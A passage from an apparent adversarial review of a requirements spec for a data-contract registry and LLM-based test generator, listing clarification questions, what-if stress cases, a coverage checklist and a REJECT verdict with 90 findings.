- **Clause** (R-30a):
  > THE registry SHALL catalog the first and record an **id-collision warning**
- **Question for the author**: Is "first" by ascending file path (code-point order), or by Git Trees API response order?
- **Default assumption if not answered**: Ascending code-point order of the full file path.

#### CN-8: Declared-version regression and non-semver versions are not flagged
- **Dimension**: Completeness
- **Clause** (R-33a):
  > IF a new content-differing version carries the **same** declared `version` as the version it supersedes
- **Question for the author**: Should a declared version that goes down (1.2.0 → 1.1.0) or is non-semver also be flagged?
- **Default assumption if not answered**: Only an unchanged version is flagged (current text).

#### CN-9: Entity-name matching rules (case and normalisation)
- **Dimension**: Consistency
- **Clause** (R-34):
  > THE registry SHALL, for a given entity name, be able to identify the set of source variants that carry it
- **Question for the author**: Are `TaskPublished` and `taskpublished` the same entity? D-61 matches case-insensitively for grounding, but R-34 and R-53 do not say.
- **Default assumption if not answered**: Exact, case-sensitive match for R-34/R-53/compat; D-61 stays case-insensitive for prose mentions only.

#### CN-10: Encryption key type and transport minimums
- **Dimension**: Ambiguity
- **Clause** (R-42):
  > Data at rest SHALL be encrypted (DynamoDB and S3 default/KMS encryption)
- **Question for the author**: Is AWS-owned or default encryption acceptable, or is a customer-managed KMS key required? Is a minimum TLS version and an S3 deny-non-TLS policy required?
- **Default assumption if not answered**: Service-default encryption, TLS 1.2+, and S3 bucket policy denying `aws:SecureTransport = false`.

#### CN-11: Query-filter validation and unknown filter values
- **Dimension**: Completeness
- **Clause** (R-50):
  > It SHALL support optional filters `?source=`, `?entity=`, and `?validation=`.
- **Question for the author**: What does `?validation=bogus` return, or `?conforming=yes` (R-109), or `?source=<unknown>`: 400, an empty 200, or 404 (R-54 "targets a `source` … that does not exist")?
- **Default assumption if not answered**: 400 for an invalid enum or boolean value; 200 with `[]` for a well-formed filter matching nothing.

#### CN-12: "appropriate content type" for raw YAML
- **Dimension**: Ambiguity
- **Clause** (R-52):
  > served with an appropriate content type.
- **Question for the author**: What exact `Content-Type` should be used, and should there be a `Content-Disposition`?
- **Default assumption if not answered**: `application/yaml; charset=utf-8`, served inline.

#### CN-13: The in-flight run id returned by a 409 cannot be resolved
- **Dimension**: Consistency
- **Clause** (R-15):
  > it SHALL respond `409 Conflict` with the in-flight run's id
- **Question for the author**: Should GET /crawls/{runId} resolve an in-flight id? R-12 persists the record only on completion, so it currently 404s, and R-54 does not list `runId`.
- **Default assumption if not answered**: Yes. The record is persisted at start as `running` (HR-4 R-12a), and an unknown runId returns 404.

#### CN-14: `/latest` semantics
- **Dimension**: Ambiguity
- **Clause** (R-90):
  > `GET /test-artifacts/{runId}` / `GET /test-artifacts/latest`

  (R-125):
  > `GET /functional-test-jobs/latest`
- **Question for the author**: Is "latest" the most recently started run/job, or the most recent `succeeded` one? What is returned when none exist?
- **Default assumption if not answered**: The most recent `succeeded`; 404 when none exist.

#### CN-15: Requirements read for a source whose snapshot was wiped
- **Dimension**: Ambiguity
- **Clause** (R-112):
  > IF a requirements read targets a `source`/`id` not in the catalog, THE registry SHALL respond `404 Not Found`
- **Question for the author**: After R-105 wipes a source to zero requirements, does GET /requirements/{source} return 404 or 200 with an empty set?
- **Default assumption if not answered**: 200 with an empty set plus spec hash and last-crawled time, because the source was observed.

#### CN-16: Cross-reference and document-status drift
- **Dimension**: Consistency
- **Clause** (R-60):
  > (an in-app form, not a Hosted-UI redirect — D-16/D-17)

  (header):
  > **Status:** Draft (Phase 1 — Specify, Adversarial Review component)

  (footer):
  > <!-- End of spec v0.6.0
- **Question for the author**: Can these be corrected?
  - R-60 cites D-16 (versionNotBumped); it should cite D-17/D-67.
  - The status says "Draft" although §3.11 is "Implemented + deployed".
  - The footer says v0.6.0 for a v0.8.2 document, and its last line is duplicated.
  - D-60 and D-70 are not marked superseded (by D-84 and D-74).
- **Default assumption if not answered**: The numbered requirements govern, and the drifted metadata is ignored.

#### CN-17: The writer permission list in R-71 omits the generation endpoints
- **Dimension**: Consistency
- **Clause** (R-71):
  > **`writer`** (may additionally call `POST /refresh`)
- **Question for the author**: Should R-71 enumerate POST /generate-tests and POST /generate-functional-tests, as R-80a and R-115a require?
- **Default assumption if not answered**: Writers may call all three POST routes; readers may call none.

#### CN-18: An environment variable that is set but empty
- **Dimension**: Ambiguity
- **Clause** (R-83a):
  > WHILE any required environment variable is unset, THE generated test SHALL be **skipped**
- **Question for the author**: Does an empty-string value count as unset?
- **Default assumption if not answered**: Yes; empty or whitespace-only values are treated as unset.

#### CN-19: Data precondition for conformance tests that must see records
- **Dimension**: Completeness
- **Clause** (R-83):
  > A test that finds **zero records** SHALL fail rather than pass, because nothing was validated (R-134h).
- **Question for the author**: Who guarantees that the target environment holds at least one record per mapped entity? Without that, a correct app in a fresh environment fails.
- **Default assumption if not answered**: Seeding is the future runner's responsibility, and the manifest documents the precondition per test.

#### CN-20: How the requirements section is identified
- **Dimension**: Ambiguity
- **Clause** (R-102):
  > appearing under the document's **"Functional Requirements (EARS)"** section (`## 3. …`)
- **Question for the author**: Is the section matched by heading text, by `## 3.`, or by both? What about `## 4. Functional Requirements (EARS)`?
- **Default assumption if not answered**: Matched by heading text containing "Functional Requirements" at level 2, regardless of the number.

#### CN-21: EARS-type detection rules (case, markup, negation)
- **Dimension**: Ambiguity
- **Clause** (R-103):
  > derive its **EARS type** from the leading keyword — `WHEN`→`event`, `IF`→`unwanted`, `WHILE`→`state`, `WHERE`→`optional`, none-of-these→`ubiquitous` — and its **modality** (`SHALL` / `SHOULD` / `MAY`), taking the first modality keyword present.
- **Question for the author**: Is matching case-sensitive? Is `**WHEN**` in bold recognised? Is "leading" the first word, or the first keyword anywhere (for example "For each …, WHEN …")? Does `SHALL NOT` carry a separate polarity?
- **Default assumption if not answered**: Case-sensitive upper-case keywords, markdown stripped, first word after the id, and polarity not captured.

#### CN-22: `earsConforming` checks modality only
- **Dimension**: Ambiguity
- **Clause** (R-104):
  > IF an extracted requirement carries **no** modality keyword (`SHALL`/`SHOULD`/`MAY`), THE registry SHALL catalog it flagged **`earsConforming: false`**
- **Question for the author**: Is the name intended to suggest structural EARS validity? "The system SHALL be fast" is flagged conforming.
- **Default assumption if not answered**: The flag means "has a modality keyword" only, and the SPA tooltip says so.

#### CN-23: Format of the declared spec version
- **Dimension**: Ambiguity
- **Clause** (R-106):
  > and — WHERE the document declares one — its **`Spec version`**.
- **Question for the author**: What exact pattern is parsed (for example `**Spec version:** 0.8.2` anywhere in the first N lines)?
- **Default assumption if not answered**: The first match of `Spec version:\s*([0-9A-Za-z.\-]+)` in the document; otherwise `null`.

#### CN-24: Ordering ties under "code-point order with numeric runs"
- **Dimension**: Ambiguity
- **Clause** (R-88):
  > "Stable ordering" means **code-point** order (numeric runs by value for ids such as `CRE-R-2` < `CRE-R-10`), never the host's locale
- **Question for the author**: How are `R-01` and `R-1` ordered, given equal numeric value, and how is `R-17` vs `R-17a` ordered? Is R-109's "natural order" the same algorithm?
- **Default assumption if not answered**: Numeric runs compare by value, then by length, then by code point; R-109 uses the same comparator.

#### CN-25: Commit SHA vs tree fetched by branch name (TOCTOU)
- **Dimension**: Completeness
- **Clause** (R-11):
  > the resolved **commit SHA** of the crawled branch tip
- **Question for the author**: Should the tree be fetched by the resolved commit's tree SHA rather than the branch name, so that the recorded SHA matches the bytes cataloged if the branch moves mid-crawl?
- **Default assumption if not answered**: Resolve branch → commit once, then fetch the tree and blobs from that commit.

#### CN-26: Preconditions/setup are not structured or rendered
- **Dimension**: Completeness
- **Clause** (R-117a):
  > A functional-test plan SHALL describe a cross-service scenario as: **preconditions/setup**,
- **Question for the author**: R-117b structures the trigger, propagation and assertions, but not setup. Is setup rendered into executable code, or kept as a comment only?
- **Default assumption if not answered**: Comment only; tests needing setup will be flagged by the critic.

#### CN-27: `equals` semantics
- **Dimension**: Ambiguity
- **Clause** (R-117b(c)):
  > `operator` ∈ `exists` | `equals` | `matchesType`.
- **Question for the author**: Is `equals` deep or strict? Does `1` equal `"1"` when CDC stringifies? Are object key order and array order significant?
- **Default assumption if not answered**: Vitest `toEqual` (deep), no type coercion, and array order significant.

#### CN-28: Payload values may contain realistic personal data
- **Dimension**: Completeness (compliance)
- **Clause** (R-117b(a)):
  > (a) The trigger SHALL carry a **concrete JSON `payload`**, whose keys are properties of the publisher variant's `schema[]`, instead of a prose `payloadShape`.
- **Question for the author**: Must LLM-generated payload values be visibly synthetic (no realistic student names, emails or IDs), given that they are committed to git and later sent to live services?
- **Default assumption if not answered**: The prompt instructs synthetic values with a fixed `e2e-` prefix, and the validator rejects email-shaped values outside a reserved test domain.

#### CN-29: No teardown for live writes
- **Dimension**: Completeness
- **Clause** (R-117a):
  > the **propagation step** (the CDC wait/poll between publisher and consumer), and the **assertions** (which state to verify in which service)
- **Question for the author**: Should plans carry a cleanup step, given that each future run writes records into publisher and consumer services?
- **Default assumption if not answered**: No teardown; the future runner owns environment hygiene.

#### CN-30: "API-map entry" is singular, but plans span services
- **Dimension**: Ambiguity
- **Clause** (R-119):
  > keyed by a content hash over `{requirement text, contract content hash(es), API-map entry, model id, prompt version}`
- **Question for the author**: Does the key cover the API-map entries of every service in the plan (the publisher, and the consumer read-back)?
- **Default assumption if not answered**: Yes, all entries for every service named in the grounded context.

#### CN-31: No operator path to force re-synthesis of a withheld plan
- **Dimension**: Completeness
- **Clause** (D-82):
  > It is re-synthesised only when its inputs, the prompt version, or the plan-schema version change.
- **Question for the author**: Should there be an explicit per-requirement cache-evict option? Otherwise a single bad LLM sample leaves a requirement untested until unrelated inputs change.
- **Default assumption if not answered**: Bumping the prompt version is the only lever (evicts all plans).

#### CN-32: Sort key for deterministic findings and A-nn id stability
- **Dimension**: Ambiguity
- **Clause** (R-131):
  > Deterministic findings SHALL be recorded in the committed manifest (`adversarial: { findings }`, deterministically sorted, no timestamps)
- **Question for the author**: What is the sort key? Are `A-nn` ids assigned after sorting, so that adding one plan renumbers every later finding and produces large diffs?
- **Default assumption if not answered**: Sorted by (target file, attack, rule letter, evidence) and numbered after sorting.

#### CN-33: Do unevidenced critic findings drive a FAIL verdict?
- **Dimension**: Ambiguity
- **Clause** (R-132):
  > 2. `FAIL — review findings` IF any Critical or Major finding remains;
- **Question for the author**: Do `unevidenced: true` critic findings (D-79), or any critic findings, count toward FAIL? What does "remains" mean when there is no suppression mechanism? Should `critic: unavailable` qualify a PASS?
- **Default assumption if not answered**: All findings count. "Remains" means "exists". The verdict text appends "(critic unavailable)" when R-141 applies.

#### CN-34: Lowercase modality words give zero clauses
- **Dimension**: Completeness
- **Clause** (D-76):
  > A requirement's text is split into clauses at each `SHALL`/`SHOULD`/`MAY` occurrence (word-boundary, case-sensitive).
- **Question for the author**: Should a source requirement written with lowercase "shall" produce zero clauses, which makes R-134(f) coverage vacuously satisfied?
- **Default assumption if not answered**: Treat zero segmented clauses on a requirement as a Minor finding "no modality clause to cover".

#### CN-35: Format of the ADVERSARIAL REVIEW HANDOFF block
- **Dimension**: Ambiguity
- **Clause** (R-144):
  > Its output SHALL **end** with an `## ADVERSARIAL REVIEW HANDOFF` block (`generated_dir`, `in_product_reports`, `run`, `functional_job`).
- **Question for the author**: What is the exact syntax (`key: value` lines?), and what is emitted for an absent value (no functional job in §3.9 mode)?
- **Default assumption if not answered**: One `key: value` line per field, with `none` for absent values.

#### CN-36: A product requirement depends on Claude Code tooling configuration
- **Dimension**: Feasibility (scope)
- **Clause** (R-144):
  > The repo `CLAUDE.md` chains the `adversarial-test-review` skill on that block, mirroring the enhancer review chain
- **Question for the author**: Is this sentence normative for the registry (testable), or informative? D-83 places the skills outside the deployed registry.
- **Default assumption if not answered**: Informative only, and excluded from the requirement-traced test suite.

#### CN-37: Measurement conditions for NFR-1 latency
- **Dimension**: Verifiability
- **Clause** (NFR-1):
  > Read endpoints SHOULD respond within **300 ms p95** (excluding cold starts)
- **Question for the author**: Measured where (client or gateway), under what request rate, over what window, and how are cold starts identified at low traffic, where most requests may be cold?
- **Default assumption if not answered**: Gateway `IntegrationLatency`, 1 req/s for 10 min after a warm-up, with init-duration invocations excluded.

#### CN-38: NFR-2 least privilege conflicts with D-58's account-wide grant
- **Dimension**: Consistency
- **Clause** (NFR-2):
  > IAM roles SHALL follow least privilege

  (D-58):
  > the **inference-profile ARN is intentionally account-wide**
- **Question for the author**: Should D-58 be recorded as an explicit, time-boxed exception in NFR-2, so that a least-privilege audit test can pass?
- **Default assumption if not answered**: Yes, as an exception listed in NFR-2 with D-58's revisit trigger.

#### CN-39: No actor attribution or log retention for write operations
- **Dimension**: Completeness (audit)
- **Clause** (R-12):
  > summarising: run id, start/end timestamps, which sources were crawled, and per-source counts
- **Question for the author**: Should crawl-run, generation-run and job records store the triggering principal (`cognito:username`)? What is the CloudWatch log retention period?
- **Default assumption if not answered**: Record `triggeredBy` on every write-path record, with log retention of <N> days set in IaC.

#### CN-40: CORS allow-list for the API
- **Dimension**: Completeness
- **Clause** (D-68):
  > `WebStack.ts` configures a custom domain `test-gen-${stage}.e2etest-nonprod.collegeboard.org`
- **Question for the author**: Is the API's CORS policy restricted to that origin (plus localhost for dev)?
- **Default assumption if not answered**: Allow-list = the stage's custom domain plus `http://localhost:<port>`, with credentials not allowed (bearer header only).

#### CN-41: Rendering untrusted repository content in the SPA
- **Dimension**: Completeness
- **Clause** (R-62):
  > THE front-end SHALL display its metadata, its raw ODCS YAML, and its version history.
- **Question for the author**: Must contract descriptions, raw YAML and requirement text (R-113) always be rendered as text, never as HTML or markdown?
- **Default assumption if not answered**: Rendered as escaped text only; no HTML or markdown rendering of repository content.

#### CN-42: No accessibility target for the SPA
- **Dimension**: Completeness
- **Clause** (§3.7):
  > ### 3.7 Web Front-End (React SPA)
- **Question for the author**: Is a WCAG conformance level required for the sign-in gate, browse toggles and diff view?
- **Default assumption if not answered**: No formal target for v1, and keyboard operability of the toggles and the sign-in form.

---

## What-If Stress Test Questions

- What if an author changes a contract's `domain` from `create` to `creator`? Without BLK-7, a new entry appears, the old one is orphaned, and compat roles from ENTITY_FLOWS stop resolving (R-84b step 3 skips).
- What if the fine-grained GitHub PAT (D-14) reaches its expiry date? Every refresh fails under R-13 and the catalog freezes silently. Is any alert or expiry warning required?
- What if `SOURCE_BRANCH` is set to a branch that does not exist? Is that a failed source (keep prior), or a reachable repo with zero contracts (R-14 success) whose requirements are then wiped by R-105?
- What if `CONTRACT_PATH_PREFIX` is changed to an empty directory? R-14 records success with 0 discoveries. Under any future BLK-7 rule, are all prior contracts marked removed?
- What if a contract declares `apiVersion: v3.1.1` or `v3.2.0` while the vendored schema is v3.1.0 (R-20)? Is it invalid, validated anyway, or flagged?
- What if the consumer marks a required field nullable and the publisher marks it non-nullable, or the reverse? R-84a compares logical types only; nullability compatibility is unspecified.
- What if `BEDROCK_MODEL_ID` differs between stages? Every plan's cache key differs (R-119), so each stage commits a different functional tree from the same catalog. Which stage's tree is authoritative?
- What if the critic is unavailable for weeks (R-141)? The verdict ignores critic status, so `PASS` looks the same with or without a critic pass.
- What if a reviewer commits a tree whose verdict is `FAIL — review findings`? Nothing blocks it, by design (D-73). Is a commit-time warning in the CLI required?
- What if USER_PASSWORD_AUTH (D-67) is used to brute-force `writer@demo` directly against Cognito, bypassing the SPA? Is advanced security, lockout or MFA required on the writer group?
- What if two requirement ids differ only by sub-letter case (`R-17a` vs `R-17A`)? Is that a collision under D-49?
- What if a §3.9 generation run and a §3.11 job both rewrite `generated-tests/` concurrently in one CLI invocation? Is the functional subtree excluded from R-92's "replace the tree wholesale"? (R-92 replaces `generated-tests/`, and R-123 replaces `generated-tests/functional/`; the overlap is undefined.)
- What if the S3 object for a cataloged version (R-41) is missing while the DynamoDB version item exists? Does GET /contracts/{s}/{id}/raw return 404, 500, or something else?

---

## Completeness Checklist

| Coverage Area | Status | Notes |
|---|---|---|
| Happy path | ✅ Covered | Crawl, validate, catalog, serve, generate, synthesise and review are all specified, with edge-case tables |
| Auth / permission failure | ⚠️ Partial | API 401/403 is specified for every route (R-16, R-56, R-80a, R-112, R-115a). SPA sign-in failure, token expiry, sign-out and group-revocation latency are missing (HR-1, HR-3, HR-37) |
| Input validation (client) | ❌ Missing | No client-side validation is specified for the sign-in form or filter inputs (low impact) |
| Input validation (server) | ⚠️ Partial | ODCS and plan-schema validation are strong. YAML limits, identity charset, query params, and catalog strings in emitted code/paths are missing (BLK-10, HR-14, HR-17, CN-11) |
| Network / dependency failure | ⚠️ Partial | GitHub (R-13), Bedrock denial (E-46) and the critic (R-141) are covered. DynamoDB/S3 failures, Bedrock throttling and tree truncation are missing (HR-4, HR-15, HR-23) |
| Concurrent access | ⚠️ Partial | Crawl single-flight exists (R-15, with TTL undefined). Crawl vs generation and job vs job are missing (HR-2, HR-21, HR-22) |
| Data lifecycle (CRUD) | ⚠️ Partial | Contract create/update and requirement replace/drop are covered. Contract removal, invalid-entry identity and retention are missing (BLK-7, BLK-8, HR-20) |
| Non-functional (latency, throughput) | ⚠️ Partial | Targets exist, but conflict with the gateway limit, are SHOULD-level, and lack measurement conditions (HR-5, HR-12, CN-5, CN-37) |
| Compliance / audit logging | ⚠️ Partial | Structured logs and redaction exist. Actor attribution, log retention and synthetic-data rules are missing (CN-28, CN-39, HR-38) |
| Graceful degradation | ⚠️ Partial | Skip-with-reason, critic isolation and unobserved-state retention are good. Deterministic-stage isolation, hard timeouts and empty-input wipes are missing (HR-6, HR-11, HR-16) |
| [EARS only] Every WHEN has an IF counterpart | ⚠️ Partial | Missing for R-10/R-12 (storage), R-60, R-64, R-80 (timeout/persist), R-115 (job start/kill), R-126, R-127 |
| [EARS only] Every WHILE state has entry + exit | ⚠️ Partial | "Crawl in progress": the exit via TTL is undefined (HR-2). "Authenticated": no exit (HR-1). "Env var unset": OK |
| [EARS only] Every WHERE has a NOT-WHERE behaviour | ⚠️ Partial | R-64 "hidden or disabled" is ambiguous (CN-4). R-106's absent case is unspecified (BLK-1). R-03 is covered by R-14, and R-84c by "match by name" |
| [Contract only] All fields typed & nullable declared | N/A | contract_mode not active |
| [Contract only] Versioning & breaking-change policy | N/A | contract_mode not active |
| [Contract only] SLA terms measurable & monitored | N/A | contract_mode not active |
| [Contract only] Ownership & escalation path | N/A | contract_mode not active |
| [Contract only] PII classified & retention defined | N/A | contract_mode not active |
| [Contract only] Semantic glossary / ID space agreed | N/A | contract_mode not active |
| [Contract only] Machine-readable schema + enforcement | N/A | contract_mode not active |

---

## Severity Summary

| Severity | Count |
|---|---|
| 🔴 Blocker | 10 |
| 🟠 High Risk | 38 |
| 🟡 Clarification Needed | 42 |
| **Total** | **90** |

**Verdict: REJECT** (≥ 1 blocker). Return to the spec owner. The quickest path to ACCEPT WITH CONDITIONS:
1. A single "post-D-63 reconciliation" edit covering BLK-3, BLK-4, BLK-5, BLK-6, HR-13 and HR-36.
2. Folding the changelog into the requirements (BLK-2).
3. Adding contract-removal and invalid-identity rules (BLK-7, BLK-8).
4. A decision on ungrounded write paths (BLK-9).
5. An artifact sanitisation requirement (BLK-10).
6. Fixing BLK-1 mechanically.
